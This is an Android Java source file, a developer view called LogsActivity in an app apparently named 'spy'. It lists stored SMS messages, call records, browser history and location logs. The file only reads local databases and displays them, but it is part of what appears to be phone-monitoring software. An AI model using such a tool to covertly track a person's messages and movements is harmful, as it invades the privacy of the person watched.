package edu.uj.jkordas.spy.developer;

import android.app.Activity;
import android.content.Context;
import android.database.Cursor;
import android.os.Bundle;
import android.provider.Browser;
import android.view.LayoutInflater;
import android.view.Menu;
import android.view.View;
import android.view.ViewGroup;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.ListView;
import android.widget.TextView;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;

import edu.uj.jkordas.spy.DAO.BrowserHistoryDataSource;
import edu.uj.jkordas.spy.DAO.CallDataSource;
import edu.uj.jkordas.spy.DAO.LocationDataSource;
import edu.uj.jkordas.spy.DAO.SmsDataSource;
import edu.uj.jkordas.spy.POJO.Call;
import edu.uj.jkordas.spy.POJO.Location;
import edu.uj.jkordas.spy.POJO.Sms;
import edu.uj.jkordas.spy.POJO.VisitedPage;
import edu.uj.jkordas.spy.R;


public class LogsActivity extends Activity {
    public static final String TYPE = "type";
    public static final String MESSAGES_TYPE = "messages_type";
    public static final String CALLS_TYPE = "calls_type";
    public static final String HISTORY_TYPE = "history_type";
    public static final String LOCATIONS_TYPE = "locations_type";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_logs);

        Bundle intent = getIntent().getExtras();
        String type = intent.getString("type");

        final Context context = getApplicationContext();
        final ArrayList<String> list = new ArrayList<String>();
        Button clearTable = (Button) findViewById(R.id.btn_clear_table);

        if (type.equals(MESSAGES_TYPE)) {
            TextView tvTitle = (TextView) findViewById(R.id.tv_log_title);
            tvTitle.setText("Message Logs");
            clearTable.setOnClickListener(new View.OnClickListener() {

                @Override
                public void onClick(View arg0) {
                    SmsDataSource dataSource = new SmsDataSource(context);
                    dataSource.open();
                    dataSource.clearTable();
                    dataSource.close();

                }
            });

            loadMessages(list);
        } else if (type.equals(CALLS_TYPE)) {
            TextView tvTitle = (TextView) findViewById(R.id.tv_log_title);
            tvTitle.setText("Calls Logs");
            clearTable.setClickable(false);

            loadCalls(list);
        } else if (type.equals(HISTORY_TYPE)) {
            TextView tvTitle = (TextView) findViewById(R.id.tv_log_title);
            tvTitle.setText("Browser history Logs");
            clearTable.setClickable(false);

            loadHistory(list);
        } else if (type.equals(LOCATIONS_TYPE)) {
            TextView tvTitle = (TextView) findViewById(R.id.tv_log_title);
            tvTitle.setText("Location Logs");
            clearTable.setClickable(false);

            loadLocations(list);
        }

        final ListView listview = (ListView) findViewById(R.id.lv_logs);

        final StableArrayAdapter adapter = new StableArrayAdapter(this,
                android.R.layout.simple_list_item_1, list);
        listview.setAdapter(adapter);

    }

    private void loadMessages(ArrayList<String> list) {
        SmsDataSource datasource = new SmsDataSource(getApplicationContext());
        datasource.open();

        List<Sms> smsList = datasource.getAllSMS();
        Iterator<Sms> it = smsList.iterator();

        while (it.hasNext()) {
            Sms currentSms = it.next();
            list.add(currentSms.toString());
        }
        datasource.close();
    }

    private void loadCalls(ArrayList<String> list) {
        CallDataSource datasource = new CallDataSource(getApplicationContext());
        datasource.open();

        List<Call> smsList = datasource.getAllCalls();
        Iterator<Call> it = smsList.iterator();

        while (it.hasNext()) {
            Call currentCall = it.next();
            list.add(currentCall.toString());
        }
        datasource.close();
    }


    private void loadHistory(ArrayList<String> list) {
        BrowserHistoryDataSource datasource = new BrowserHistoryDataSource(
                getApplicationContext());
        datasource.open();

        List<VisitedPage> visitedPageList = datasource.getAllVisitedPages();
        Iterator<VisitedPage> it = visitedPageList.iterator();

        while (it.hasNext()) {
            VisitedPage visitedPage = it.next();
            list.add(visitedPage.toString());
        }
        datasource.close();
    }

    private void loadLocations(ArrayList<String> list) {
        LocationDataSource datasource = new LocationDataSource(getApplicationContext());
        datasource.open();

        List<Location> locationList = datasource.getAllLocations();
        Iterator<Location> it = locationList.iterator();

        while (it.hasNext()) {
            Location currentLocation = it.next();
            list.add(currentLocation.toString());
        }
        datasource.close();
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.messages, menu);
        return true;
    }

    private class StableArrayAdapter extends ArrayAdapter<String> {
        private Context context;

        HashMap<String, Integer> mIdMap = new HashMap<String, Integer>();

        public StableArrayAdapter(Context context, int textViewResourceId, List<String> objects) {
            super(context, textViewResourceId, objects);
            this.context = context;
            for (int i = 0; i < objects.size(); ++i) {
                mIdMap.put(objects.get(i), i);
            }
        }

        @Override
        public long getItemId(int position) {
            String item = getItem(position);
            return mIdMap.get(item);
        }

        @Override
        public boolean hasStableIds() {
            return true;
        }

        @Override
        public View getView(int position, View convertView, ViewGroup parent) {
            LinearLayout listItem;

            if (convertView == null) {
                listItem = new LinearLayout(getContext());
                LayoutInflater inflater = (LayoutInflater) getContext().getSystemService(
                        Context.LAYOUT_INFLATER_SERVICE);
                inflater.inflate(R.layout.list_item, listItem, true);
            } else {
                listItem = (LinearLayout) convertView;
            }
            final String slocation = getItem(position);

            final TextView tv = (TextView) listItem.findViewById(R.id.tv_list_item);
            tv.setText(slocation);

            return listItem;
        }

    }

}
